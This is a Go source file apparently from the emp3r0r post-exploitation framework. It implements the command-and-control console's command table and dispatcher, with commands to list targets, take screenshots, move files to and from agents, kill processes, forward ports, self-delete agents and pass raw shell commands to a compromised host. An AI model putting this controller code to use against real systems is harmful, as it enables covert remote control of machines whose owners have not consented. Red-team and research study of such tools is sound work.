//go:build linux
// +build linux

package cc

import (
	"strconv"
	"strings"
	"sync"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// CommandHelp holds all commands and their help string, command: help
var CommandHelp = map[string]string{
	HELP:              "Print this help, 'help <module>' gives help for a module",
	"target":          "Set target. eg. `target <index>`",
	"file_manager":    "Browse remote files in your local file manager with SFTP protocol",
	"set":             "Set an option. eg. `set <option> <val>`",
	"use":             "Use a module. eg. `use <module_name>`",
	"run":             "Run selected module, make sure you have set required options",
	"info":            "What options do we have?",
	"upgrade_agent":   "Upgrade agent on selected target",
	"ls":              "List current directory of selected agent",
	"mv":              "Move a file to another location on selected target",
	"cp":              "Copy a file to another location on selected target",
	"cd":              "Change current working directory of selected agent",
	"rm":              "Delete a file/directory on selected agent",
	"mkdir":           "Create new directory on selected agent",
	"pwd":             "Current working directory of selected agent",
	"ps":              "Process list of selected agent",
	"kill":            "Terminate a process on selected agent: eg. `kill <pid>`",
	"get":             "Download a file from selected agent",
	"put":             "Upload a file to selected agent",
	"screenshot":      "Take a screenshot of selected agent",
	"suicide":         "Kill agent process, delete agent root directory",
	"ls_targets":      "List all targets",
	"ls_modules":      "List all modules",
	"search":          "Search modules",
	"ls_port_fwds":    "List all port mappings",
	"debug":           "Set debug level: -1 (least verbose) to 1 (most verbose)",
	"delete_port_fwd": "Delete a port mapping",
	"exit":            "Exit",
}

// CmdFuncs holds a map of helper functions
var CmdFuncs = map[string]func(){
	"ls_targets":    ls_targets,
	"ls_modules":    ListModules,
	"ls_port_fwds":  ListPortFwds,
	"info":          CliListOptions,
	"run":           ModuleRun,
	"screenshot":    TakeScreenshot,
	"file_manager":  OpenFileManager,
	"upgrade_agent": UpgradeAgent,
	"suicide":       Suicide,
}

// CmdFuncsWithArgs commands that accept a single string parameter
var CmdFuncsWithArgs = map[string]func(string){
	"ls":              FSNoArgCmd,
	"pwd":             FSNoArgCmd,
	"cd":              FSCmdDst,
	"rm":              FSCmdDst,
	"mkdir":           FSCmdDst,
	"mv":              FSCmdSrcDst,
	"cp":              FSCmdSrcDst,
	"put":             UploadToAgent,
	"get":             DownloadFromAgent,
	"ps":              FSNoArgCmd,
	"net_helper":      FSNoArgCmd,
	"kill":            FSCmdDst,
	"delete_port_fwd": DeletePortFwdSession,
	"debug":           setDebugLevel,
	"search":          ModuleSearch,
	"set":             setOptVal,
	"label":           setTargetLabel,
	"target":          setCurrentTarget,
}

// CmdTime Record the time spent on each command
var (
	CmdTime      = make(map[string]string)
	CmdTimeMutex = &sync.Mutex{}
)

const HELP = "help" // fuck goconst

// CmdHandler processes user commands
func CmdHandler(cmd string) (err error) {
	cmdSplit := util.ParseCmd(cmd)
	if len(cmdSplit) == 0 {
		return
	}

	switch {
	case cmd == "":
		return
	case cmdSplit[0] == HELP:
		if len(cmdSplit) > 2 {
			CliPrintError("WTF?")
			return
		}
		if len(cmdSplit) == 1 {
			CmdHelp("")
			return
		}
		CmdHelp(cmdSplit[1])

	case cmdSplit[0] == "use":
		if len(cmdSplit) != 2 {
			CliPrintError("use what? %s", strconv.Quote(cmd))
			return
		}
		defer SetDynamicPrompt()
		for mod := range ModuleHelpers {
			if mod == cmdSplit[1] {
				CurrentMod = cmdSplit[1]
				for k := range Options {
					delete(Options, k)
				}
				UpdateOptions(CurrentMod)
				CliPrintInfo("Using module %s", strconv.Quote(CurrentMod))
				ModuleDetails(CurrentMod)
				description, exists := emp3r0r_data.ModuleComments[CurrentMod]
				if exists {
					CliPrint("%s", description)
				}
				CliListOptions()

				return
			}
		}
		CliPrintError("No such module: %s", strconv.Quote(cmdSplit[1]))

	default:
		helper := CmdFuncs[cmd]
		if helper != nil {
			helper()
			return
		}
		helper_w_arg := CmdFuncsWithArgs[cmdSplit[0]]
		if helper_w_arg == nil && CurrentTarget != nil {
			CliPrintWarning("Exec: %s on %s", strconv.Quote(cmd), strconv.Quote(CurrentTarget.Tag))
			SendCmdToCurrentTarget(cmd, "")
			return
		}
		if CurrentTarget == nil && helper_w_arg == nil {
			CliPrintError("No agent selected, try `target <index>`")
			return
		}
		helper_w_arg(cmd)
	}
	return
}

// CmdHelp prints help in two columns
// print help for modules
func CmdHelp(mod string) {
	help := make(map[string]string)
	if mod == "" {
		CliPrettyPrint("Command", "Help", &CommandHelp)
		return
	}

	for modname, modhelp := range emp3r0r_data.ModuleComments {
		if mod == modname {
			exists := false
			help, exists = emp3r0r_data.ModuleHelp[modname]
			if !exists {
				help = map[string]string{"<N/A>": modhelp}
			}
			for m, h := range emp3r0r_data.ModuleComments {
				if m == mod {
					CliPrint("\n%s", h)
				}
			}
			CliPrettyPrint("Option", "Help", &help)
			return
		}
	}
	CliPrintError("Help yourself")
}

func setCurrentTarget(cmd string) {
	cmdSplit := strings.Fields(cmd)
	if len(cmdSplit) != 2 {
		CliPrintError("set target to what? %s", strconv.Quote(cmd))
		return
	}
	defer SetDynamicPrompt()
	var target_to_set *emp3r0r_data.AgentSystemInfo

	// select by tag or index
	target_to_set = GetTargetFromTag(strings.Join(cmdSplit[1:], " "))
	if target_to_set == nil {
		index, e := strconv.Atoi(cmdSplit[1])
		if e == nil {
			target_to_set = GetTargetFromIndex(index)
		}
	}

	select_agent := func(a *emp3r0r_data.AgentSystemInfo) {
		CurrentTarget = a
		GetTargetDetails(CurrentTarget)
		CliPrintSuccess("Now targeting %s", CurrentTarget.Tag)
		SetDynamicPrompt()

		// kill shell and sftp window
		if AgentSFTPPane != nil {
			CliPrintInfo("Updating sftp window")
			err = AgentSFTPPane.KillPane()
			if err != nil {
				CliPrintWarning("Updating sftp window: %v", err)
			}
			AgentSFTPPane = nil
		}
		if AgentShellPane != nil {
			CliPrintInfo("Updating shell window")
			err = AgentShellPane.KillPane()
			if err != nil {
				CliPrintWarning("Updating shell window: %v", err)
			}
			AgentShellPane = nil
		}

		CliPrint("Run `file_manager` to open a SFTP session")
		updateAgentExes(target_to_set)
	}

	if target_to_set == nil {
		// if still nothing
		CliPrintError("Target does not exist, no target has been selected")
		return

	} else {
		// lets start the bash shell
		go select_agent(target_to_set)
	}
}

func setTargetLabel(cmd string) {
	cmdSplit := strings.Fields(cmd)
	if len(cmdSplit) < 2 {
		CliPrintError("Invalid command %s, usage: 'label <tag/index> <label>'", strconv.Quote(cmd))
		return
	}
	target := new(emp3r0r_data.AgentSystemInfo)
	label := strings.Join(cmdSplit[2:], " ")

	// select by tag or index
	index, e := strconv.Atoi(cmdSplit[1])
	if e != nil {
		// try by tag
		target = GetTargetFromTag(cmdSplit[1])
		if target == nil {
			// cannot parse
			CliPrintError("Cannot set target label by index: %v", e)
			return
		}
	} else {
		// try by index
		target = GetTargetFromIndex(index)
	}

	// target exists?
	if target == nil {
		CliPrintError("Target does not exist")
		return
	}
	Targets[target].Label = label // set label
	labelAgents()
	CliPrintSuccess("%s has been labeled as %s", target.Tag, label)
	ListTargets() // update agent list
}

func setOptVal(cmd string) {
	cmdSplit := util.ParseCmd(cmd)
	if len(cmdSplit) < 2 {
		CliPrintError("set what?")
		return
	}
	// hand to SetOption helper
	SetOption(cmdSplit[1:])
	CliListOptions()
}
